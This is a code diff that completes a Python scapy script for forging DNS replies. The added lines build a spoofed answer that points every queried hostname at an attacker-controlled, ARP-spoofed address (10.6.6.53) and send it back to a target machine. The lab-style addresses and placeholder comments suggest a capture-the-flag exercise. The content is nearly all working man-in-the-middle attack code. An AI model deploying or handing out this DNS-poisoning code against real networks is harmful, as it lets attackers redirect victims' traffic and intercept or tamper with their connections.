@@ -11,17 +11,33 @@ macaddr = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range
 ipaddr_we_arp_spoofed = "10.6.6.53"
 targetmac= "4c:24:57:ab:ed:84"
 targetip="10.6.6.35"
-# target port is dynamic
-targetport=29694
 
 def handle_dns_request(packet):
-    # Need to change mac addresses, Ip Addresses, and ports below.
-    # We also need
+
+    # Target's requested packet here:
+    ip = packet.getlayer(scapy.all.IP)
+    udp = packet.getlayer(scapy.all.UDP)
+
+    # Build dns answer
+    queried_host = packet.qd.qname[:-1].decode("utf-8")
+    resolved_ip = ipaddr_we_arp_spoofed
+    dns_answer = scapy.all.DNSRR(
+        rrname=queried_host + ".",
+        ttl=330,
+        type="A",
+        rclass="IN",
+        rdata=resolved_ip)
+
     eth = Ether(src=macaddr, dst=targetmac)   # need to replace mac addresses
-    ip  = IP(dst=targetip, src=ipaddr)                          # need to replace IP addresses
-    udp = UDP(dport=targetport, sport=53)                             # need to replace ports
+    ip  = IP(dst=ip.src, src=ip.dst)                          # need to replace IP addresses
+    udp = UDP(dport=udp.sport, sport=udp.dport)                             # need to replace ports
     dns = DNS(
-        # MISSING DNS RESPONSE LAYER VALUES 
+        id = packet[scapy.all.DNS].id,
+        qr = 1,
+        aa = 0,
+        rcode = 0,
+        qd = packet.qd,
+        an = dns_answer
     )
     dns_response = eth / ip / udp / dns
     sendp(dns_response, iface="eth0")
